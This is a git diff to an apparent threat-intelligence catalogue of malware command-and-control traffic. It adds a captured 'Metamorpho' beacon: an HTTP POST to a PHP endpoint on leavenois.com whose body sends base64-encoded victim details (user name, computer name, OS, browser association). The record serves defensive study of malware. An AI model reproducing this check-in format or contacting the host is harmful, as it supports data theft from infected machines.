@@ -823,7 +823,26 @@ Keep-Alive: timeout=5, max=100
 Connection: Keep-Alive
 Content-Type: text/html; charset=UTF-8
 ~~~
+~~~
+POST /hooponopono/puma.php HTTP/1.0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 158
+Host: leavenois.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/3.0 (compatible; Indy Library)
+
+vv=OP22--22-10&vw=&mods=&uname=VVNFUi1QQw%3D%3D&cname=Ti05Ng%3D%3D&os=V2luZG93cyA3IFByb2Zlc3Npb25hbDYuMTc2MDEtNjQ%3D&is=&iss=SUUuQXNzb2NGaWxlLkhUTQ%3D%3D&iav=
+
+HTTP/1.0 200 OK
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Date: Tue, 22 Oct 2019 20:06:32 GMT
+Server: LiteSpeed
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho.png "Metamorpho")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho-1.png "Metamorpho")
 
 #### MilkyBoy
 ~~~
